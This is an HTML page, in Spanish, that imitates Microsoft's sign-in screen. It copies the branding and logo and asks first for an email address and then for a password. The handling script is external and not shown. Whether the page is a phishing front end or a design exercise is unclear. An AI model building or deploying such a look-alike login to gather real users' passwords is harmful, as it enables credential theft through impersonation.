<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Microsoft - Iniciar sesión</title>
    <link rel="stylesheet" href="style.css">
</head>
<body>
    <div class="login-container">
        <div class="login-box">
           <div class="logo">
            <div class="logo-squares">
                <div class="square red"></div>
                <div class="square green"></div>
                <div class="square blue"></div>
                <div class="square yellow"></div>
            </div>
            <p class="title-mic">Microsoft</p>
        </div>
            <h1 class="sesion">Iniciar sesión</h1>
            
            <form id="loginForm">
                <div class="input-group" id="emailGroup">
                    <input type="text" id="email" class="input-field" autocomplete="username" placeholder="Correo electrónico, teléfono o Skype">
                    <div class="error-message" id="emailError">Introduce una dirección de correo electrónico, un número de teléfono o un nombre de Skype válidos.</div>
                    <div class="links-container">
                        <label>¿No tiene una cuenta?</label>
                        <a href="#" class="link">Cree una.</a>
                    </div>
                    <a href="#" class="forgot-link">¿No puede acceder a su cuenta?</a>
                </div>
                
                <div class="input-group hidden" id="passwordGroup">
                    <label class="input-label" for="password">Contraseña</label>
                    <div class="password-container">
                        <input type="password" id="password" class="input-field" autocomplete="current-password" placeholder="Introduce la contraseña">
                        <button type="button" class="password-toggle" id="togglePassword">
                            <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 16 16">
                                <path fill="currentColor" d="M10.5 8a2.5 2.5 0 1 1-5 0 2.5 2.5 0 0 1 5 0z"/>
                                <path fill="currentColor" d="M0 8s3-5.5 8-5.5S16 8 16 8s-3 5.5-8 5.5S0 8 0 8zm8 3.5a3.5 3.5 0 1 0 0-7 3.5 3.5 0 0 0 0 7z"/>
                            </svg>
                        </button>
                    </div>
                    <div class="error-message" id="passwordError">Introduce la contraseña.</div>
                    <a href="#" class="forgot-link">¿Ha olvidado su contraseña?</a>
                </div>
                
                <div class="buttons-container">
                    <button type="button" class="btn btn-secondary" id="backBtn" onclick="goBack()" style="margin-left: 42%;">Atrás</button>
                    <button type="button" class="btn btn-primary" id="nextBtn" onclick="handleNext()">Siguiente</button>
                </div>
            </form>
        </div>
        
        <div class="footer-links">
            <a href="#" class="footer-link">Términos de uso</a>
            <span class="link-separator">·</span>
            <a href="#" class="footer-link">Privacidad y cookies</a>
        </div>
    </div>

    <script src="script.js"></script>
</body>
</html>
